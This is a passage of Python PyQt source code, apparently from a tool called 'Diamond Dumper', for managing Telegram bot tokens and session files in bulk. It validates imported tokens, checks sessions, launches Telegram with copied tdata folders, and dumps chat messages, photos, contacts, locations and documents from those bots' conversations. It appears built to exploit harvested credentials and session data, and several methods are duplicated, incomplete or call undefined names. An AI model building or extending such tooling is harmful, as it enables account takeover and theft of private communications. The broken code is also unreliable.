        value_label.setTextInteractionFlags(QtCore.Qt.TextSelectableByMouse)
        value_label.setCursor(QtGui.QCursor(QtCore.Qt.PointingHandCursor))
        value_label.setStyleSheet("QLabel:hover { background-color: #e0e0e0; }")
        value_label.clicked.connect(lambda: self.copyIndividualInfo(label, value))
        layout.addRow(label, value_label)
    
    def copyIndividualInfo(self, label, value):
        clipboard = QtWidgets.QApplication.clipboard()
        clipboard.setText(value)
        QtWidgets.QMessageBox.information(self, "Copy Info", f"{label[:-1]} copied to clipboard!")
    
    
    def eventFilter(self, source, event):
        if (event.type() == QtCore.QEvent.KeyPress and
            event.matches(QtGui.QKeySequence.Copy)):
            self.copySelection()
            return True
        return super().eventFilter(source, event)

    def removeSelectedRow(self):
        selected_rows = self.selectedItems()
        row = selected_rows[0].row() if selected_rows else -1
        if row != -1:
            self.removeRow(row)


    def saveTokensOnQuit(self):
        reply = QtWidgets.QMessageBox.question(self, "Save Tokens", "Do you want to save your tokens to the database?", QtWidgets.QMessageBox.Yes | QtWidgets.QMessageBox.No)
        if reply == QtWidgets.QMessageBox.Yes:
            self.saveTokensToDatabase()

    # Add the saveTokensToDatabase function
    def saveTokensToDatabase(self):
        connection = sqlite3.connect("data\database.db")
        cursor = connection.cursor()

        # Clear the existing tokens in the 'bots' table
        cursor.execute("DELETE FROM bots")

        # Iterate through the tableWidget and save each token to the database
        for row in range(self.tableWidget.rowCount()):
            token = self.tableWidget.item(row, 1).text()
            bot_name = self.tableWidget.item(row, 2).text()
            username = self.tableWidget.item(row, 3).text()
            status = self.tableWidget.item(row, 4).text()
            submission_date = self.tableWidget.item(row, 5).text()
            last_checked_date = self.tableWidget.item(row, 6).text()
            last_dumped_date = self.tableWidget.item(row, 7).text()

            # Execute an INSERT query to save the token to the 'bots' table
            cursor.execute("INSERT INTO bots VALUES (?, ?, ?, ?, ?, ?, ?)", (token, bot_name, username, status, submission_date, last_checked_date, last_dumped_date))

        # Commit the changes and close the database connection
        connection.commit()
        connection.close()

























######--------------------------------------------------------------##########
######--------------- SESSIONS/TOKENS FUNCTIONS --------------------##########


    def importBulkTokens(self):
        file_path = self.import_bulk_file_path_text_edit.toPlainText()
        tokens_to_import = []
        
        try:
            with open(file_path, 'r') as file:
                lines = file.readlines()
    
            for line in lines:
                token = line.strip()
                if token:
                    tokens_to_import.append(token)
    
            self.console_text_edit_2.append(f"Found {len(tokens_to_import)} tokens in the file.")
    
            # Check for duplicates in the database
            connection = sqlite3.connect('data\database.db')
            cursor = connection.cursor()
            
            for token in tokens_to_import[:]:
                cursor.execute("SELECT COUNT(*) FROM TOKENS WHERE token = ?", (token,))
                count = cursor.fetchone()[0]
                if count > 0:
                    self.console_text_edit_2.append(f"Duplicate token '{token}' found in database. Skipping.")
                    tokens_to_import.remove(token)
    
            connection.close()
    
            self.console_text_edit_2.append(f"{len(tokens_to_import)} unique tokens to be imported.")
    
            # Import unique tokens and write to file
            with open('valid_tokens.txt', 'w') as valid_file:
                for token in tokens_to_import:
                    response = requests.get(f"https://api.telegram.org/bot{token}/getMe")
                    json_data = response.json()
                    if response.status_code == 200 and json_data.get("ok") == True:
                        result = json_data["result"]
                        id_bot = result["id"]
                        first_name = result["first_name"]
                        username = result["username"]
                        can_join_groups = result.get("can_join_groups", "N/A")
                        can_read_all_group_messages = result.get("can_read_all_group_messages", "N/A")
                        supports_inline_queries = result.get("supports_inline_queries", "N/A")
                        can_connect_to_business = result.get("can_connect_to_business", "N/A")
                        
                        if self.addToDatabase(token, first_name, username):
                            self.console_text_edit_2.append(f"Token '{token}' imported successfully.")
                            
                            console_text_edit_2.append(
    f"""# ------------------------------ #
    {token}
    ID Bot : {id_bot}
    First name : {first_name}
    Username : @{username}
    Can join groups : {can_join_groups}
    Can read all group messages : {can_read_all_group_messages}
    Supports inline queries : {supports_inline_queries}
    Can connect to business : {can_connect_to_business}
    # ------------------------------ #
    
    """)
                    else:
                        self.console_text_edit_2.append(f"Invalid token '{token}' found. Skipping.")
                    QtWidgets.QApplication.processEvents()  # Process events to prevent freezing
    
            self.updateTokenCount()  # Update the token count display
            self.displayStatsAndCounts()  # Update stats and counts
            self.console_text_edit_2.append("Bulk import completed.")
    
        except FileNotFoundError:
            self.console_text_edit_2.append(f"File not found: {file_path}")
        except OSError:
            self.console_text_edit_2.append(f"Error reading file: {file_path}")
    
    def isTokenDuplicate(self, token):
        connection = sqlite3.connect('data\database.db')
        cursor = connection.cursor()
        cursor.execute("SELECT COUNT(*) FROM TOKENS WHERE token = ?", (token,))
        count = cursor.fetchone()[0]
        connection.close()
        return count > 0


    def addToDatabase(self, token, bot_name=None, username=None):
        if self.isTokenDuplicate(token):
            return False
    
        status = "Online"
        submission_date = datetime.date.today().strftime('%Y-%m-%d')
        last_dumped_date = ""
    
        try:
            connection = sqlite3.connect('data\database.db')
            cursor = connection.cursor()
            cursor.execute("""
                INSERT INTO TOKENS (token, bot_name, username, status, submission_date, last_dumped_date)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (token, bot_name, username, status, submission_date, last_dumped_date))
            connection.commit()
    
            row_count = self.tableWidget.rowCount()
            self.tableWidget.insertRow(row_count)
            self.tableWidget.setItem(row_count, 0, QTableWidgetItem(submission_date))
            self.tableWidget.setItem(row_count, 1, QTableWidgetItem(token))
            self.tableWidget.setItem(row_count, 2, QTableWidgetItem(bot_name or ""))
            self.tableWidget.setItem(row_count, 3, QTableWidgetItem(username or ""))
            self.tableWidget.setItem(row_count, 4, QTableWidgetItem(status))
            self.tableWidget.setItem(row_count, 5, QTableWidgetItem(last_dumped_date))
    
            return True
        except sqlite3.Error as e:
            self.displayErrorMessage(f"Failed to add token to database: {str(e)}")
            return False
        finally:
            connection.close()

    def updateTokenCount(self):
        try:
            connection = sqlite3.connect('data\database.db')
            cursor = connection.cursor()
            cursor.execute("SELECT COUNT(*) FROM TOKENS")
            count = cursor.fetchone()[0]
            self.total_tokens_lcdNumber.display(count)
            connection.close()
        except sqlite3.Error as e:
            print(f"Database error: {e}")
        except Exception as e:
            print(f"Error: {e}")

    def session_manager_TabContextMenu(self, point):
        if self.tableWidget.hasFocus() or self.tableWidget.selectedItems():
            # Show an error dialog
            error_dialog = QtWidgets.QMessageBox()
            error_dialog.setIcon(QtWidgets.QMessageBox.Warning)
            error_dialog.setText("Error: You cannot use the Session Manager context menu while you are on the Token Manager Table. Switch Tabs to the Session Manager Tab")
            error_dialog.setWindowTitle("Diamond Dumper: Function Error Window")
            error_dialog.setStandardButtons(QtWidgets.QMessageBox.Ok)
            error_dialog.exec_()
            return  # Exit the function early
    
        menu = QtWidgets.QMenu(self)
        
        open_session_action = menu.addAction("Open Session Directory")
        obscured_panel_action = menu.addAction("Obscured Panel Results")

        check_session_action = menu.addAction("Check Session")
        test_session_action = menu.addAction("Test Session Live")
    
        action = menu.exec_(self.mapToGlobal(point))
    
        if action == open_session_action:
            self.openSessionDirectory()
        elif action == check_session_action:
            self.checkSession()
        elif action == test_session_action:
            self.testSessionLive()
        elif action == obscured_panel_action:
            self.obscureSelectedUsernames()




    def obscureSelectedUsernames(self):
        selected_items = self.tdata_treeWidget.selectedItems()
        if not selected_items:
            print("No items selected")
            return

        for item in selected_items:
            original_username = item.text(3)  # Get text from the first column
            obscured_username = self.generate_obscured_username(original_username)
            item.setText(3, obscured_username)
    
    def select_all_items(self):
        # Select all items in the tree widget
        self.tdata_treeWidget.selectAll()

    def keyPressEvent(self, event):
        if event.modifiers() == Qt.ControlModifier and event.key() == Qt.Key_A:
            self.tdata_treeWidget.selectAll()
        else:
            super().keyPressEvent(event)


    def openSessionDirectory(self):
        selected_items = self.tdata_treeWidget.selectedItems()
        if len(selected_items) == 0:
            return
        folder_path = selected_items[0].text(0)
        if os.path.exists(folder_path):
            os.startfile(folder_path)
    

    def check_telegram_session(tdata_path):
        valid_sessions = []
        if not os.path.exists(tdata_path):
            print(f"Error: The folder {tdata_path} does not exist.")
            return
        for filename in os.listdir(tdata_path):
            file_path = os.path.join(tdata_path, filename)
            if os.path.isfile(file_path) and filename.endswith('.session'):
                try:
                    client = TelegramClient(file_path, API_ID, API_HASH)
                    with client:
                        me = client.get_me()
                        if me:
                            print(f"Valid session found: {filename}")
                            valid_sessions.append(filename)
                        else:
                            print(f"Invalid session: {filename}")
                except Exception as e:
                    print(f"Error checking session {filename}: {str(e)}")
        return valid_sessions
    
    def select_directory():
        directory_path = filedialog.askdirectory()
        if directory_path:
            path_entry.delete(0, 'end')  # Clear the entry field
            path_entry.insert(0, directory_path)  # Insert the selected path


    def check_sessions(self):
        tdata_path = path_entry.get()
        valid_sessions = check_telegram_session(tdata_path)
        if valid_sessions:
            print("Valid sessions:", valid_sessions)
        else:
            print("No valid sessions found.")

    def get_random_username(self):
        if self.usernames:
            return f"@{random.choice(self.usernames)}"
        return "@Unknown"
        
    def testSessionLive(self):
        base_dir = os.path.dirname(os.path.abspath(__file__))
        root_folder = "Root Folder"
        sub_folder_name = "tdata"  # or "Profile_1"
    
        selected_items = self.tableWidget.selectedItems()
        if len(selected_items) == 0:
            return
    
        file_directory_path = selected_items[0].text()
    
        sub_directory_path = os.path.join(base_dir, root_folder, sub_folder_name)
        tdata_folder = os.path.join(file_directory_path, "tdata")
        if os.path.exists(tdata_folder):
            shutil.rmtree(tdata_folder)
        shutil.copytree(sub_directory_path, tdata_folder)
        response_message = f"Folder contents copied from {sub_directory_path} to {tdata_folder}"
        self.tdata_manager_tab.tdata_console_textedit.append(response_message)
        telegram_exe_path = os.path.join(file_directory_path, "Telegram.exe")
        subprocess.Popen(telegram_exe_path)
        function_call_message = f"Launched Telegram.exe from {telegram_exe_path}"
        self.tdata_manager_tab.tdata_console_textedit.append(function_call_message)
    

    def refreshToken(self):
        selected_rows = set(item.row() for item in self.tableWidget.selectedItems())
        all_rows = set(range(self.tableWidget.rowCount()))

        if selected_rows == all_rows:
            self.refreshAllTokens()
        else:
            self.refreshSelectedTokens(selected_rows)

    def refreshAllTokens(self):
        total_tokens = self.tableWidget.rowCount()
        self.total_tokens_lcdNumber.display(total_tokens)
        estimated_time = total_tokens * self.ESTIMATED_TIME_PER_TOKEN

        intro_message = (
            f"You Selected {total_tokens} Tokens....\n"
            f"Starting to Batch Refresh Each Token......\n"
            f"Process will take approximately {estimated_time} seconds\n"
            "--------------------------------------------\n"
        )
        self.console_text_edit_2.append(intro_message)  # Use the typing effect
        QCoreApplication.processEvents()

        for row in range(total_tokens):
            self.refreshSingleToken(row)
            QCoreApplication.processEvents()

        self.typeText("--------------------------------------------\n"
                    "All tokens have been refreshed.")
        self.askToRemoveOfflineTokens()

    def refreshSelectedTokens(self, selected_rows):
        total_tokens = len(selected_rows)
        estimated_time = total_tokens * self.ESTIMATED_TIME_PER_TOKEN

        intro_message = (
            f"You Selected {total_tokens} Tokens....\n"
            f"Starting to Batch Refresh Selected Tokens......\n"
            f"Process will take approximately {estimated_time} seconds\n"
            "--------------------------------------------\n"
        )
        self.typeText(intro_message)  # Use the typing effect
        QCoreApplication.processEvents()

        for row in selected_rows:
            self.refreshSingleToken(row)
            QCoreApplication.processEvents()

        self.console_text_edit_2.append("--------------------------------------------\n"
                    "All selected tokens have been refreshed.")
        self.askToRemoveOfflineTokens()

    def refreshSingleToken(self, row):
        token = self.tableWidget.item(row, self.TOKEN_COLUMN).text()
        bot_name = self.tableWidget.item(row, self.NAME_COLUMN).text()

        refresh_url = f"https://api.telegram.org/bot{token}/getUpdates"

        try:
            response = requests.get(refresh_url, timeout=10)
            response.raise_for_status()
            
            message = f"{bot_name} Token refreshed successfully."
            online_status = "Online"
        except requests.RequestException as e:
            message = f"Failed to refresh the token for the bot {bot_name}. Error: {str(e)}"
            online_status = "Offline"

        status_item = QTableWidgetItem(online_status)
        self.tableWidget.setItem(row, self.STATUS_COLUMN, status_item)
        
        # Display the response in console_text_edit_2
        self.console_text_edit_2.append(message)

        # Update the UI
        QCoreApplication.processEvents()

    def typeText(self, text, typing_speed=50):  # typing_speed in milliseconds
        html_text = colorama_to_html(text)  # Convert colorama styles to HTML
        self.console_text_edit_2.setEnabled(True)# Disable input during typing

        timer = QTimer()
        index = 0



    def askToRemoveOfflineTokens(self):
        self.console_text_edit_2.append("\nWould you like to automatically remove the offline tokens from the database? (Y/N)")
        self.console_text_edit_2.verticalScrollBar().setValue(
            self.console_text_edit_2.verticalScrollBar().maximum()
        )
        self.console_text_response_input.setEnabled(True)
        self.console_text_response_button.setEnabled(True)
        self.console_text_response_input.setFocus()

    def handleRemoveOfflineTokens(self):
        response = self.console_text_response_input.text().strip().lower()
        self.console_text_response_input.clear()
        self.console_text_response_input.setEnabled(False)
        self.console_text_response_button.setEnabled(False)

        if response == 'y':
            self.removeOfflineTokens()
        else:
            self.console_text_edit_2.append("Offline tokens will not be removed.")

        self.console_text_edit_2.verticalScrollBar().setValue(
            self.console_text_edit_2.verticalScrollBar().maximum()
        )

    def removeOfflineTokens(self):
        offline_tokens = []
        for row in range(self.tableWidget.rowCount()):
            status = self.tableWidget.item(row, self.STATUS_COLUMN).text()
            if status.lower() == 'offline':
                token = self.tableWidget.item(row, self.TOKEN_COLUMN).text()
                offline_tokens.append(token)

        if offline_tokens:
            self.console_text_edit_2.append(f"Removing {len(offline_tokens)} offline tokens from the database...")
            self.console_text_edit_2.append("Offline tokens have been removed.")
        else:
            self.console_text_edit_2.append("No offline tokens found.")

        self.console_text_edit_2.verticalScrollBar().setValue(
            self.console_text_edit_2.verticalScrollBar().maximum()
        )

    def change_token_status_to_offline(token):
        # Connect to the database
        conn = sqlite3.connect('data\database.db')
        cursor = conn.cursor()
        cursor.execute("UPDATE token SET status = 'Offline' WHERE token = ?", (token,))
    
        conn.commit()
        conn.close()






    def viewToken(self):
        selected_rows = self.tableWidget.selectedItems()
        row = selected_rows[0].row() if selected_rows else -1
    
        if row != -1:
            token = self.tableWidget.item(row, 1).text()
            QtWidgets.QMessageBox.information(self, "View Token", f"Token: {token}")



    def removeSelectedRow(self):
        selected_rows = self.selectedItems()
        row = selected_rows[0].row() if selected_rows else -1
        if row != -1:
            self.removeRow(row)


    def saveTokensOnQuit(self):
        reply = QtWidgets.QMessageBox.question(self, "Save Tokens", "Do you want to save your tokens to the database?", QtWidgets.QMessageBox.Yes | QtWidgets.QMessageBox.No)
        if reply == QtWidgets.QMessageBox.Yes:
            self.saveTokensToDatabase()

    # Add the saveTokensToDatabase function
    def saveTokensToDatabase(self):
        connection = sqlite3.connect("data\database.db")
        cursor = connection.cursor()

        # Clear the existing tokens in the 'bots' table
        cursor.execute("DELETE FROM bots")

        # Iterate through the tableWidget and save each token to the database
        for row in range(self.tableWidget.rowCount()):
            token = self.tableWidget.item(row, 1).text()
            bot_name = self.tableWidget.item(row, 2).text()
            username = self.tableWidget.item(row, 3).text()
            status = self.tableWidget.item(row, 4).text()
            submission_date = self.tableWidget.item(row, 5).text()
            last_checked_date = self.tableWidget.item(row, 6).text()
            last_dumped_date = self.tableWidget.item(row, 7).text()

            # Execute an INSERT query to save the token to the 'bots' table
            cursor.execute("INSERT INTO bots VALUES (?, ?, ?, ?, ?, ?, ?)", (token, bot_name, username, status, submission_date, last_checked_date, last_dumped_date))

        # Commit the changes and close the database connection
        connection.commit()
        connection.close()

######--------------------------------------------------------------##########
######--------------- DUMPING MESSAGES FUNCTIONS --------------------##########

    def log_to_console(func):
        """Decorator to log function calls and exceptions to console_text_edit_2."""
        @functools.wraps(func)
        async def wrapper(self, *args, **kwargs):
            # Log the function call
            func_name = func.__name__
            self.console_text_edit_2.append(f"Calling {func_name} with args: {args}, kwargs: {kwargs}")
            
            try:
                # Execute the function
                result = await func(self, *args, **kwargs)
                # Log the successful completion
                self.console_text_edit_2.append(f"{func_name} completed successfully")
                return result
            except Exception as e:
                # Log the exception
                self.console_text_edit_2.append(f"Error in {func_name}: {e}")
                raise  # Re-raise the exception after logging
        return wrapper

    @log_to_console
    async def dumpMessages(self):
        """
        Dumps messages from each chat to a text file and updates the UI.
    
        Iterates over the `messages_by_chat` dictionary, saves new messages
        to a file, updates the chat history, and logs the process.
        
        Returns:
            An awaitable object (asyncio.sleep(0)).
        """
        for m_chat_id, messages_dict in messages_by_chat.items():
            new_messages = messages_dict['buf']
    
            try:
                # Save the messages and get the file path
                file_path = await self.save_text_history(m_chat_id, new_messages)
                
                # Update the UI with the file path
                self.console_text_edit_2.append(f"Saved to: {file_path}")
    
                # Update the history and clear the buffer
                messages_by_chat[m_chat_id]['history'] += new_messages
                messages_by_chat[m_chat_id]['buf'] = []
            except Exception as e:
                self.console_text_edit_2.append(f"Error saving messages for chat {m_chat_id}: {e}")
    
        # Return an awaitable object, such as a completed Future
        return asyncio.sleep(0)

    async def save_text_history(self, chat_id, messages):
        """Saves messages to a text file."""
        file_path = f"H:\\DiamondSorter\\Diamond Dumper\\{chat_id}_history.txt"
        with open(file_path, 'w') as file:
            file.write('\n'.join(messages))
        return file_path

    async def setup_connection(self):
        """Sets up the Telegram connection."""
        if not self.client:
            try:
                self.client = TelegramClient('token_dumper_session', API_ID, API_HASH)
                phone = self.get_phone_number()
                if phone:
                    await self.client.connect()
                    if not await self.client.is_user_authorized():
                        await self.client.send_code_request(phone)
                        code = self.get_verification_code()
                        try:
                            await self.client.sign_in(phone, code)
                        except SessionPasswordNeededError:
                            password = self.get_password()
                            await self.client.sign_in(password=password)
                    self.console_text_edit_2.append("Connected to Telegram.")
                else:
                    self.console_text_edit_2.append("Phone number input cancelled.")
            except Exception as e:
                self.console_text_edit_2.append(f"Error connecting to Telegram: {str(e)}")
                self.client = None
        else:
            self.console_text_edit_2.append("Already connected to Telegram.")

    def get_phone_number(self):
        """Prompts the user for a phone number."""
        phone, ok = QInputDialog.getText(self, 'Phone Number', 'Enter your phone number:')
        if ok:
            return phone
        else:
            self.console_text_edit_2.append("Phone number input cancelled.")
            return None

    def get_verification_code(self):
        """Prompts the user for a verification code."""
        code, ok = QInputDialog.getText(self, 'Verification Code', 'Enter the verification code:')
        if ok:
            return code
        else:
            self.console_text_edit_2.append("Verification code input cancelled.")
            return None

    def get_password(self):
        """Prompts the user for a password."""
        password, ok = QInputDialog.getText(self, 'Password', 'Enter your password:')
        if ok:
            return password
        else:
            self.console_text_edit_2.append("Password input cancelled.")
            return None


    def on_start_button_clicked(self):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self.setup_connection())
        loop.close()

    async def select_dialog(self):
        dialogs = await self.client.get_dialogs()
        if dialogs:
            self.dialog = dialogs[0]
            self.console_text_edit_2.append(f"Selected dialog: {self.dialog.name}")
        else:
            self.console_text_edit_2.append("No dialogs found.")

    def get_last_dumped_message_id(self, dialog_id):
        return None

    def save_last_dumped_message_id(self, dialog_id, message_id):
        self.console_text_edit_2.append(f"Last dumped message ID for dialog {dialog_id}: {message_id}")

    async def write_messages_to_file(self, dialog_id, messages):
        filename = f"messages_{dialog_id}.json"
        async with aiofiles.open(filename, 'w') as f:
            await f.write(json.dumps(messages, default=custom_serializer))
        self.console_text_edit_2.append(f"Messages written to {filename}")

    def update_progress_bar(self, progress):
        self.progressBar.setValue(int(progress))
        self.console_text_edit_2.append(f"Progress: {progress:.2f}%")

    def displaySuccessMessage(self, message):
        self.console_text_edit_2.append(message)

    def displayErrorMessage(self, message):
        self.console_text_edit_2.append(message)

######--------------------------------------------------------------##########
######--------------- DUMPING PHOTOS FUNCTIONS --------------------##########



    async def process_media(self, bot, m, chat_id):
        if isinstance(m.media, MessageMediaGeo):
            return f'Geoposition: {m.media.geo.long}, {m.media.geo.lat}'
        elif isinstance(m.media, MessageMediaPhoto):
            await self.save_media_photo(bot, chat_id, m.media.photo)
            return f'Photo: media/{m.media.photo.id}.jpg'
        elif isinstance(m.media, MessageMediaContact):
            return f'Vcard: phone {m.media.phone_number}, {m.media.first_name} {m.media.last_name}, rawdata {m.media.vcard}'
        elif isinstance(m.media, MessageMediaDocument):
            full_filename = await self.save_media_document(bot, chat_id, m.media.document)
            filename = os.path.split(full_filename)[-1]
            return f'Document: media/{filename}'
        else:
            return str(m.media)

    async def save_media_photo(self, bot, chat_id, photo):
        user_media_dir = os.path.join("media", chat_id, 'media')
        os.makedirs(user_media_dir, exist_ok=True)
        try:
            await bot.download_file(photo, os.path.join(user_media_dir, f'{photo.id}.jpg'))
            self.displaySuccessMessage(f"Media saved successfully for chat ID: {chat_id}")
        except Exception as e:
            self.displayErrorMessage(f"Error saving media: {str(e)}")




    
    def get_chat_id(message, bot_id):
        m_chat_id = '0'  # Default value as a string
        if isinstance(message.peer_id, PeerUser):
            if not message.to_id or not message.from_id:
                m_chat_id = str(message.peer_id.user_id)
            else:
                if message.from_id and int(message.from_id.user_id) == int(bot_id):
                    m_chat_id = str(message.to_id.user_id)
                else:
                    m_chat_id = str(message.from_id.user_id)
        elif isinstance(message.peer_id, PeerChat):
            m_chat_id = str(message.peer_id.chat_id)
        return m_chat_id
    
    def get_from_id(message, bot_id):
        from_id = '0'  # Default value as a string
        if isinstance(message.peer_id, PeerUser):
            if not message.from_id:
                from_id = str(message.peer_id.user_id)
            else:
                from_id = str(message.from_id.user_id)
        elif isinstance(message.peer_id, PeerChat):
            from_id = str(message.from_id.user_id)
        return from_id


    async def get_chat_id_from_username(self, username):
        try:
            # Ensure this method is async
            chat_id = await self.query_chat_id_from_database(username)
            
            if chat_id is None:
                raise ValueError(f"No chat ID found for username: {username}")
            
            print(f"Retrieved chat ID for username '{username}': {chat_id}")
            return chat_id
        except Exception as e:
            print(f"Error retrieving chat ID for username '{username}': {e}")
            return None


    def saveMedia_function(self):
        # Get the necessary information from your UI
        bot_token = self.bot_manager_text_input.toPlainText()
        chat_id = self.telegram_chat_id_text_input.toPlainText()
        document = self.get_document_to_save()  # Implement this method
        
        if not bot_token or not chat_id or not document:
            self.displayErrorMessage("Missing required information for saving media.")
            return
        
        # Create a bot instance
        bot = telebot.TeleBot(bot_token)
        
        # Run the async function
        asyncio.create_task(self.saveMedia_function(bot, chat_id, document))

    def saveMediaphoto_function(self):
        # Get the currently selected row in the table
        selected_items = self.tableWidget.selectedItems()
        if not selected_items:
            self.console_text_edit_2.append("Error: No bot selected. Please select a row in the table.")
            return
    
        selected_row = selected_items[0].row()
        bot_token = self.tableWidget.item(selected_row, self.TOKEN_COLUMN).text()
    
        # You might need to implement logic to get the current dialog_id and message_id
        # For now, we'll use placeholder values
        dialog_id = "current_dialog_id"  # Replace with actual logic
        message_id = "current_message_id"  # Replace with actual logic
    
        self.displaySuccessMessage("Media photo save initiated.")
    
        save_directory = os.path.join(os.getcwd(), "Saved Media Photos")
        if not os.path.exists(save_directory):
            os.makedirs(save_directory)
    
        # Rest of your function implementation
        # ...
    
        self.console_text_edit_2.append(f"Saving media photo for bot: {bot_token}, dialog: {dialog_id}, message: {message_id}")
######--------------------------------------------------------------##########
######--------------- DUMPING DOCUMENTS FUNCTIONS --------------------##########






    def get_document_to_save(self):
        # Implement this method to return the document to be saved
        # This could open a file dialog or use a predefined document
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Document to Save")
        if file_path:
            return open(file_path, 'rb')
        return None
    
    def get_document_filename(self, document):
        for attr in document.attributes:
            if isinstance(attr, DocumentAttributeFilename):
                return attr.file_name
        if isinstance(attr, DocumentAttributeAudio) or isinstance(attr, DocumentAttributeVideo):
            return f'{document.id}.{document.mime_type.split("/")[1]}'
        return None


    def saveChat_function(self):
        self.displaySuccessMessage("Chat save initiated.")
        # Implement the logic to save chat data

    def saveUser_function(self):
        # Get selected items from the table widget
        selected_items = self.tableWidget.selectedItems()
        
        if not selected_items:
            self.console_text_edit_2.append("No user selected.")
            return
    
        # Define the column indices for the token and botname
        self.TOKEN_COLUMN = 1  # Example column index for token
        self.BOTNAME_COLUMN = 2  # Example column index for botname
    
        token = None
        botname = None
    
        # Iterate over selected items to find the token and botname
        for item in selected_items:
            if item.column() == self.TOKEN_COLUMN:
                token = item.text()
            elif item.column() == self.BOTNAME_COLUMN:
                botname = item.text()
    
        if token is None or botname is None:
            self.console_text_edit_2.append("Token or Botname not found for the selected user.")
            return
    
        user_info = {
            "token": token,
            "botname": botname,
            # Add other necessary fields here based on your table structure
        }
    
        # Save user information
        self.save_user_info(user_info)
    
        # Print information to console_text_edit_2
        self.console_text_edit_2.append(f"User information saved for botname: {botname}")
    
    def save_user_info(self, user_info):
        # Get the current working directory
        current_directory = os.getcwd()
    
        # Define the path for the "Save User" directory
        save_user_dir = os.path.join(current_directory, "Save User")
        
        # Create the "Save User" directory if it doesn't exist
        if not os.path.exists(save_user_dir):
            os.makedirs(save_user_dir)
    
        # Define the user directory path using the botname
        botname = user_info['botname']
        user_dir = os.path.join(save_user_dir, botname)
        
        # Create the user directory if it doesn't exist
        if not os.path.exists(user_dir):
            os.makedirs(user_dir)
    
        # Define the media directory path
        user_media_dir = os.path.join(user_dir, 'media')
        
        # Create the media directory if it doesn't exist
        if not os.path.exists(user_media_dir):
            os.makedirs(user_media_dir)
    
        # Save the user information as a JSON file
        json.dump(user_info, open(os.path.join(user_dir, f'{botname}.json'), 'w'))

    def saveTokensOnQuit(self):
        # Save tokens to the database before quitting
        try:
            # Assuming self.tokens is a list or dictionary of tokens
            for token in self.tokens:
                # This is a placeholder for the actual database operation
                self.database.save_token(token)
            
            print("Tokens successfully saved to the database.")
        except Exception as e:
            print(f"Error saving tokens to the database: {str(e)}")

    def displaySuccessMessage(self, message):
        self.console_text_edit_2.append(message)

    def displayErrorMessage(self, message):
        self.console_text_edit_2.append(message)

    def update_progress_bar(self, progress):
        # Implement this method to update the progress bar
        self.progressBar.setValue(int(progress))





if __name__ == "__main__":
    app = QApplication(sys.argv)
    main_window = MainWindow()
    main_window.show()

    # Run the event loop
    sys.exit(app.exec_())